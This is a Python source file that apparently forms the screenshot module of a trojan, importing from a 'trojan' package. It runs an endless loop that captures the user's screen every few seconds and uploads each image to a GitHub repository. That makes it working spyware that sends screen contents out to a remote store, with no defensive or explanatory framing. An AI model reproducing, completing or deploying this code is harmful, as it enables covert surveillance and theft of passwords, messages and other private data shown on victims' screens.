import pyautogui
from datetime import datetime
import time
from trojan.localdata_dir import DirectoryHelper
from trojan.github_helper import GithubHelper
from config_reader import ConfigReader


class Screenshot:
    def __init__(self, repo_path, time_interval=10):
        self.repo_path = repo_path
        self.interval = time_interval

    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        return screenshot

    def save_screenshot(self):
        folder_path = DirectoryHelper().create_dir()
        screenshot_name = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
        file_path = f"{folder_path}/{screenshot_name}"

        screenshot = self.take_screenshot()
        screenshot.save(file_path)
        self.upload_screenshot(file_path, screenshot_name)

    def upload_screenshot(self, file_path, screenshot_name):
        # Read the content of the screenshot file
        with open(file_path, "rb") as file_inf:
            con = file_inf.read()
        # Upload the file to the repository
        g = GithubHelper()
        g.create_file(self.repo_path, f"{screenshot_name}", "screenshot", con)

    def run(self):
        while True:
            self.save_screenshot()
            time.sleep(self.interval)


if __name__ == '__main__':
    # TODO: Make this configurable
    reader = ConfigReader()
    repo_name = reader.getvar("screenshot", "repo_name")
    interval = int(reader.getvar("screenshot", "interval"))

    screenshot_taker = Screenshot(repo_name, interval)
    screenshot_taker.run()
